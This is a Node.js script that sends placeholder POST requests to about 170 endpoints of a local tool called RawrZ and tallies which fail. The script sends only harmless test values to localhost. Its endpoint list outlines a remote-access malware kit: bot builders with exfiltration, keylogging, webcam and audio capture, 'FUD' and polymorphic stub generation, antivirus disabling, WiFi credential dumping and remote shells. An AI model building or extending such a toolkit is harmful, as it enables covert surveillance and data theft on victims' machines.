// Test POST endpoints to identify failures
const http = require('http');

const postEndpoints = [
    { path: '/api/rebuild', body: {}, name: 'API Rebuild' },
    { path: '/api/irc/connect', body: { server: 'localhost', port: 6667 }, name: 'IRC Connect' },
    { path: '/api/irc/disconnect', body: {}, name: 'IRC Disconnect' },
    { path: '/api/irc/join', body: { channel: '#test' }, name: 'IRC Join' },
    { path: '/api/irc/leave', body: { channel: '#test' }, name: 'IRC Leave' },
    { path: '/api/irc/message', body: { channel: '#test', message: 'test' }, name: 'IRC Message' },
    { path: '/api/crypto/generate-report', body: {}, name: 'Crypto Generate Report' },
    { path: '/irc-bot/generate', body: { name: 'test', server: 'localhost', port: 6667 }, name: 'IRC Bot Generate' },
    { path: '/http-bot/generate', body: { name: 'test', server: 'localhost', port: 8080 }, name: 'HTTP Bot Generate' },
    { path: '/http-bot/test', body: { name: 'test', server: 'localhost', port: 8080 }, name: 'HTTP Bot Test' },
    { path: '/http-bot/compile', body: { code: 'console.log("test");', language: 'javascript' }, name: 'HTTP Bot Compile' },
    { path: '/http-bot/connect', body: { botId: 'test-bot' }, name: 'HTTP Bot Connect' },
    { path: '/http-bot/disconnect', body: { botId: 'test-bot' }, name: 'HTTP Bot Disconnect' },
    { path: '/http-bot/command', body: { botId: 'test-bot', command: 'test' }, name: 'HTTP Bot Command' },
    { path: '/http-bot/heartbeat', body: { botId: 'test-bot' }, name: 'HTTP Bot Heartbeat' },
    { path: '/http-bot/exfiltrate', body: { botId: 'test-bot', data: 'test' }, name: 'HTTP Bot Exfiltrate' },
    { path: '/http-bot/stop-exfiltration', body: { botId: 'test-bot' }, name: 'HTTP Bot Stop Exfiltration' },
    { path: '/http-bot/download/test-bot', body: { filePath: 'test.txt' }, name: 'HTTP Bot Download' },
    { path: '/http-bot/upload/test-bot', body: { filePath: 'test.txt', data: 'test' }, name: 'HTTP Bot Upload' },
    { path: '/http-bot/screenshot/test-bot', body: {}, name: 'HTTP Bot Screenshot' },
    { path: '/http-bot/keylog/test-bot', body: {}, name: 'HTTP Bot Keylog' },
    { path: '/http-bot/webcam/test-bot', body: {}, name: 'HTTP Bot Webcam' },
    { path: '/http-bot/audio/test-bot', body: {}, name: 'HTTP Bot Audio' },
    { path: '/irc-bot/generate-stub', body: { config: { name: 'test', server: 'localhost', port: 6667 }, features: ['basic'], extensions: [], encryptionOptions: {} }, name: 'IRC Bot Generate Stub' },
    { path: '/irc-bot/encrypt-stub', body: { stubCode: 'test stub code', algorithm: 'aes256' }, name: 'IRC Bot Encrypt Stub' },
    { path: '/irc-bot/save-encrypted-stub', body: { stubCode: 'test stub code', algorithm: 'aes256', filename: 'encrypted_stub.bin' }, name: 'IRC Bot Save Encrypted Stub' },
    { path: '/irc-bot/burn-encrypt', body: { botCode: 'test bot code', language: 'javascript' }, name: 'IRC Bot Burn Encrypt' },
    { path: '/irc-bot/generate-burner-stub', body: { config: { name: 'test', server: 'localhost', port: 6667 }, features: ['basic'], extensions: [], options: {} }, name: 'IRC Bot Generate Burner Stub' },
    { path: '/irc-bot/generate-fud-stub', body: { config: { name: 'test', server: 'localhost', port: 6667 }, features: ['basic'], extensions: [], options: {} }, name: 'IRC Bot Generate FUD Stub' },
    { path: '/irc-bot/test', body: { config: { name: 'test', server: 'localhost', port: 6667 } }, name: 'IRC Bot Test' },
    { path: '/irc-bot/compile', body: { code: 'console.log("test");', language: 'javascript' }, name: 'IRC Bot Compile' },
    { path: '/irc-bot/custom-features/add', body: { featureName: 'test-feature', featureConfig: { type: 'custom', enabled: true } }, name: 'IRC Bot Custom Features Add' },
    { path: '/irc-bot/feature-templates/create', body: { templateName: 'test-template', templateConfig: { type: 'custom', features: [] } }, name: 'IRC Bot Feature Templates Create' },
    { path: '/mutex/generate', body: { language: 'javascript', options: {} }, name: 'Mutex Generate' },
    { path: '/qr-generate', body: { text: 'Hello World', size: 200 }, name: 'QR Generate' },
    { path: '/barcode-generate', body: { text: '123456789', type: 'code128' }, name: 'Barcode Generate' },
    { path: '/ev-cert/generate', body: { subject: 'test', validity: 365 }, name: 'EV Cert Generate' },
    { path: '/beaconism/generate-payload', body: { target: 'test-target', payloadType: 'dll', options: {} }, name: 'Beaconism Generate Payload' },
    { path: '/stub-generator/generate', body: { language: 'javascript', features: ['basic'] }, name: 'Stub Generator Generate' },
    { path: '/stub-generator/regenerate', body: { botId: 'test-bot', reason: 'test' }, name: 'Stub Generator Regenerate' },
    { path: '/native-compiler/regenerate', body: { botId: 'test-bot', reason: 'test' }, name: 'Native Compiler Regenerate' },
    { path: '/api/analysis/malware', body: { filePath: 'test.exe' }, name: 'API Analysis Malware' },
    { path: '/api/analysis/digital-forensics', body: { target: 'test-target' }, name: 'API Analysis Digital Forensics' },
    { path: '/api/analysis/network', body: { target: 'localhost' }, name: 'API Analysis Network' },
    { path: '/api/analysis/reverse-engineering', body: { filePath: 'test.exe' }, name: 'API Analysis Reverse Engineering' },
    { path: '/analyze', body: { filePath: 'test.exe' }, name: 'Analyze' },
    { path: '/portscan', body: { target: 'localhost', ports: '1-100' }, name: 'Port Scan' },
    { path: '/mobile-scan', body: { target: 'test' }, name: 'Mobile Scan' },
    { path: '/forensics-scan', body: { target: 'test-target' }, name: 'Forensics Scan' },
    { path: '/network-scan', body: { network: '192.168.1.0', subnet: '24' }, name: 'Network Scan' },
    { path: '/vulnerability-scan', body: { target: 'localhost' }, name: 'Vulnerability Scan' },
    { path: '/security-scan', body: { target: 'localhost' }, name: 'Security Scan' },
    { path: '/malware-scan', body: { target: 'localhost' }, name: 'Malware Scan' },
    { path: '/beaconism/scan-target', body: { target: 'test-target' }, name: 'Beaconism Scan Target' },
    { path: '/stub-generator/analyze', body: { filePath: 'test.exe' }, name: 'Stub Generator Analyze' },
    { path: '/jotti/scan', body: { filePath: 'test.exe' }, name: 'Jotti Scan' },
    { path: '/jotti/scan-multiple', body: { filePaths: ['test1.exe', 'test2.exe'] }, name: 'Jotti Scan Multiple' },
    { path: '/jotti/cancel-scan', body: { jobId: 'test-job-id' }, name: 'Jotti Cancel Scan' },
    { path: '/private-scanner/scan', body: { filePath: 'test.exe' }, name: 'Private Scanner Scan' },
    { path: '/private-scanner/queue', body: { filePath: 'test.exe' }, name: 'Private Scanner Queue' },
    { path: '/private-scanner/cancel/test-scan-id', body: {}, name: 'Private Scanner Cancel' },
    { path: '/private-scanner/clear-queue', body: {}, name: 'Private Scanner Clear Queue' },
    { path: '/private-scanner/queue-settings', body: { settings: { maxConcurrent: 5, timeout: 30000 } }, name: 'Private Scanner Queue Settings' },
    { path: '/api/security/scan', body: { target: 'localhost' }, name: 'API Security Scan' },
    { path: '/api/security/fud-analysis', body: { filePath: 'test.exe' }, name: 'API Security FUD Analysis' },
    { path: '/api/security/vulnerability-check', body: { target: 'localhost' }, name: 'API Security Vulnerability Check' },
    { path: '/api/security/threat-detection', body: { target: 'localhost' }, name: 'API Security Threat Detection' },
    { path: '/api/security/stealth-mode', body: { enabled: true }, name: 'API Security Stealth Mode' },
    { path: '/api/security/anti-detection', body: { enabled: true }, name: 'API Security Anti Detection' },
    { path: '/api/crypto/test-algorithm', body: { algorithm: 'aes-256-cbc', data: 'test data' }, name: 'API Crypto Test Algorithm' },
    { path: '/hash', body: { data: 'test data', algorithm: 'sha256' }, name: 'Hash' },
    { path: '/encrypt', body: { data: 'test data', algorithm: 'aes-256-cbc', key: 'test-key' }, name: 'Encrypt' },
    { path: '/encrypt-file', body: { filePath: 'test.txt', algorithm: 'aes-256-cbc', key: 'test-key' }, name: 'Encrypt File' },
    { path: '/decrypt-file', body: { filePath: 'test.txt', algorithm: 'aes-256-cbc', key: 'test-key' }, name: 'Decrypt File' },
    { path: '/decrypt', body: { data: 'encrypted-data', algorithm: 'aes-256-cbc', key: 'test-key' }, name: 'Decrypt' },
    { path: '/advancedcrypto', body: { data: 'test data', algorithm: 'aes-256-cbc' }, name: 'Advanced Crypto' },
    { path: '/file-hash', body: { filePath: 'test.txt', algorithm: 'sha256' }, name: 'File Hash' },
    { path: '/ev-cert/encrypt-stub', body: { stubCode: 'test stub', algorithm: 'aes-256-cbc' }, name: 'EV Cert Encrypt Stub' },
    { path: '/traceroute', body: { target: 'localhost' }, name: 'Traceroute' },
    { path: '/whois', body: { domain: 'example.com' }, name: 'Whois' },
    { path: '/random', body: { type: 'string', length: 10 }, name: 'Random' },
    { path: '/password', body: { length: 12, includeSymbols: true }, name: 'Password' },
    { path: '/math', body: { expression: '2+2' }, name: 'Math' },
    { path: '/timeline-analysis', body: { data: 'test data' }, name: 'Timeline Analysis' },
    { path: '/random-math', body: { count: 5 }, name: 'Random Math' },
    { path: '/upload', body: { file: 'test.txt', data: 'test content' }, name: 'Upload' },
    { path: '/cli', body: { command: 'echo test' }, name: 'CLI' },
    { path: '/stub', body: { language: 'javascript', features: ['basic'] }, name: 'Stub' },
    { path: '/compile-asm', body: { code: 'mov eax, 1', architecture: 'x86' }, name: 'Compile ASM' },
    { path: '/compile-js', body: { code: 'console.log("test");' }, name: 'Compile JS' },
    { path: '/keygen', body: { algorithm: 'rsa', keySize: 2048 }, name: 'Keygen' },
    { path: '/sign', body: { data: 'test data', key: 'test-key' }, name: 'Sign' },
    { path: '/verify', body: { data: 'test data', signature: 'test-sig', key: 'test-key' }, name: 'Verify' },
    { path: '/base64encode', body: { data: 'test data' }, name: 'Base64 Encode' },
    { path: '/base64decode', body: { data: 'dGVzdCBkYXRh' }, name: 'Base64 Decode' },
    { path: '/hexencode', body: { data: 'test data' }, name: 'Hex Encode' },
    { path: '/hexdecode', body: { data: '746573742064617461' }, name: 'Hex Decode' },
    { path: '/urlencode', body: { data: 'test data' }, name: 'URL Encode' },
    { path: '/urldecode', body: { data: 'test%20data' }, name: 'URL Decode' },
    { path: '/fileops', body: { operation: 'read', filePath: 'test.txt' }, name: 'File Ops' },
    { path: '/textops', body: { operation: 'uppercase', text: 'test' }, name: 'Text Ops' },
    { path: '/validate', body: { type: 'email', value: 'test@example.com' }, name: 'Validate' },
    { path: '/download-file', body: { filename: 'test.txt' }, name: 'Download File' },
    { path: '/read-file', body: { filePath: 'test.txt' }, name: 'Read File' },
    { path: '/read-local-file', body: { filePath: 'test.txt' }, name: 'Read Local File' },
    { path: '/stealth-mode', body: { enabled: true }, name: 'Stealth Mode' },
    { path: '/anti-detection', body: { enabled: true }, name: 'Anti Detection' },
    { path: '/polymorphic', body: { code: 'test code', level: 'medium' }, name: 'Polymorphic' },
    { path: '/mutex/apply', body: { code: 'test code', language: 'javascript' }, name: 'Mutex Apply' },
    { path: '/upx/pack', body: { executablePath: 'test.exe' }, name: 'UPX Pack' },
    { path: '/upx/status', body: { executablePath: 'test.exe' }, name: 'UPX Status' },
    { path: '/hot-patch', body: { target: 'test-target', type: 'patch', data: {} }, name: 'Hot Patch' },
    { path: '/patch-rollback', body: { patchId: 'test-patch-id' }, name: 'Patch Rollback' },
    { path: '/app-analysis', body: { filePath: 'test.exe' }, name: 'App Analysis' },
    { path: '/device-forensics', body: { device: 'test-device' }, name: 'Device Forensics' },
    { path: '/garbage-collect', body: {}, name: 'Garbage Collect' },
    { path: '/memory-cleanup', body: {}, name: 'Memory Cleanup' },
    { path: '/file-signature', body: { filepath: 'test.txt' }, name: 'File Signature' },
    { path: '/backup', body: { source: 'test.txt', destination: 'backup' }, name: 'Backup' },
    { path: '/restore', body: { backup: 'backup.zip', destination: 'restored' }, name: 'Restore' },
    { path: '/behavior-analysis', body: { filePath: 'test.exe' }, name: 'Behavior Analysis' },
    { path: '/signature-check', body: { filePath: 'test.exe' }, name: 'Signature Check' },
    { path: '/data-recovery', body: { filePath: 'test.txt' }, name: 'Data Recovery' },
    { path: '/disassembly', body: { filePath: 'test.exe' }, name: 'Disassembly' },
    { path: '/decompilation', body: { filePath: 'test.exe' }, name: 'Decompilation' },
    { path: '/string-extraction', body: { filePath: 'test.exe' }, name: 'String Extraction' },
    { path: '/memory-analysis', body: { filePath: 'test.exe' }, name: 'Memory Analysis' },
    { path: '/process-dump', body: { processId: 1234 }, name: 'Process Dump' },
    { path: '/heap-analysis', body: { filePath: 'test.exe' }, name: 'Heap Analysis' },
    { path: '/data-conversion', body: { input: 'test data', from: 'hex', to: 'base64' }, name: 'Data Conversion' },
    { path: '/compress', body: { input: 'test data', algorithm: 'gzip' }, name: 'Compress' },
    { path: '/decompress', body: { input: 'compressed data', algorithm: 'gzip' }, name: 'Decompress' },
    { path: '/service-detection', body: { host: 'localhost', port: '80' }, name: 'Service Detection' },
    { path: '/packet-capture', body: { interface: 'eth0', duration: 10 }, name: 'Packet Capture' },
    { path: '/traffic-analysis', body: { filePath: 'capture.pcap' }, name: 'Traffic Analysis' },
    { path: '/protocol-analysis', body: { filePath: 'capture.pcap' }, name: 'Protocol Analysis' },
    { path: '/file-analysis', body: { filepath: 'test.txt' }, name: 'File Analysis' },
    { path: '/threat-detection', body: { target: 'localhost' }, name: 'Threat Detection' },
    { path: '/vulnerability-check', body: { target: 'localhost' }, name: 'Vulnerability Check' },
    { path: '/openssl/toggle-openssl', body: { enabled: true }, name: 'OpenSSL Toggle OpenSSL' },
    { path: '/openssl/toggle-custom', body: { enabled: true }, name: 'OpenSSL Toggle Custom' },
    { path: '/openssl-management/toggle', body: { type: 'openssl', enabled: true }, name: 'OpenSSL Management Toggle' },
    { path: '/openssl-management/test', body: { algorithm: 'aes-256-cbc', data: 'test data' }, name: 'OpenSSL Management Test' },
    { path: '/openssl-management/preset', body: { preset: 'default' }, name: 'OpenSSL Management Preset' },
    { path: '/implementation-check/run', body: {}, name: 'Implementation Check Run' },
    { path: '/implementation-check/force', body: {}, name: 'Implementation Check Force' },
    { path: '/health-monitor/toggle', body: { monitorId: 'test-monitor', enabled: true }, name: 'Health Monitor Toggle' },
    { path: '/health-monitor/interval', body: { monitorId: 'test-monitor', interval: 5000 }, name: 'Health Monitor Interval' },
    { path: '/red-killer/detect', body: { systems: ['windows-defender'] }, name: 'Red Killer Detect' },
    { path: '/red-killer/execute', body: { systems: ['windows-defender'] }, name: 'Red Killer Execute' },
    { path: '/red-killer/extract', body: { target: 'test-target' }, name: 'Red Killer Extract' },
    { path: '/red-killer/wifi-dump', body: { target: 'test-target' }, name: 'Red Killer WiFi Dump' },
    { path: '/beaconism/deploy', body: { payloadId: 'test-payload-id', deploymentOptions: {} }, name: 'Beaconism Deploy' },
    { path: '/red-shells/create', body: { target: 'test-target', options: {} }, name: 'Red Shells Create' },
    { path: '/red-shells/test-shell-id/execute', body: { command: 'echo Hello World' }, name: 'Red Shells Execute' },
    { path: '/stub-generator/trigger-regeneration', body: { botId: 'test-bot', reason: 'manual trigger' }, name: 'Stub Generator Trigger Regeneration' },
    { path: '/stub-generator/unpack', body: { stubData: 'test stub data', packingMethod: 'upx' }, name: 'Stub Generator Unpack' },
    { path: '/stub-generator/repack', body: { unpackId: 'test-unpack-id', newPackingMethod: 'upx', newEncryptionMethods: [], newObfuscationLevel: 'medium' }, name: 'Stub Generator Repack' },
    { path: '/native-compiler/compile', body: { sourceCode: 'console.log("Hello World");', language: 'javascript' }, name: 'Native Compiler Compile' },
    { path: '/stub-generator/auto-regeneration/enable', body: { interval: 300000, conditions: {} }, name: 'Stub Generator Auto Regeneration Enable' },
    { path: '/stub-generator/auto-regeneration/disable', body: {}, name: 'Stub Generator Auto Regeneration Disable' },
    { path: '/stub-generator/process-scheduled', body: {}, name: 'Stub Generator Process Scheduled' },
    { path: '/stub-generator/reset-stats', body: {}, name: 'Stub Generator Reset Stats' }
];

async function testPostEndpoint(endpoint) {
    return new Promise((resolve) => {
        const postData = JSON.stringify(endpoint.body);
        
        const options = {
            hostname: 'localhost',
            port: 8080,
            path: endpoint.path,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    name: endpoint.name,
                    method: 'POST',
                    path: endpoint.path,
                    status: res.statusCode,
                    success: res.statusCode >= 200 && res.statusCode < 500
                });
            });
        });

        req.on('error', (err) => {
            resolve({
                name: endpoint.name,
                method: 'POST',
                path: endpoint.path,
                status: 'ERROR',
                success: false,
                error: err.message
            });
        });

        req.setTimeout(5000, () => {
            req.destroy();
            resolve({
                name: endpoint.name,
                method: 'POST',
                path: endpoint.path,
                status: 'TIMEOUT',
                success: false,
                error: 'Request timeout'
            });
        });

        req.write(postData);
        req.end();
    });
}

async function runTests() {
    console.log('🚀 Testing RawrZ POST Endpoints...\n');
    
    const results = [];
    let passed = 0;
    let failed = 0;

    for (const endpoint of postEndpoints) {
        const result = await testPostEndpoint(endpoint);
        results.push(result);
        
        if (result.success) {
            passed++;
            console.log(`✅ ${result.name} (POST ${result.path}) - Status: ${result.status}`);
        } else {
            failed++;
            console.log(`❌ ${result.name} (POST ${result.path}) - Status: ${result.status}${result.error ? ' - ' + result.error : ''}`);
        }
    }

    console.log(`\n📊 Results: ${passed} passed, ${failed} failed`);
    console.log(`📈 Success Rate: ${((passed / (passed + failed)) * 100).toFixed(1)}%`);
    
    if (failed > 0) {
        console.log('\n❌ Failed Endpoints:');
        results.filter(r => !r.success).forEach(r => {
            console.log(`   POST ${r.path} - ${r.status}${r.error ? ' (' + r.error + ')' : ''}`);
        });
    }
}

runTests().catch(console.error);
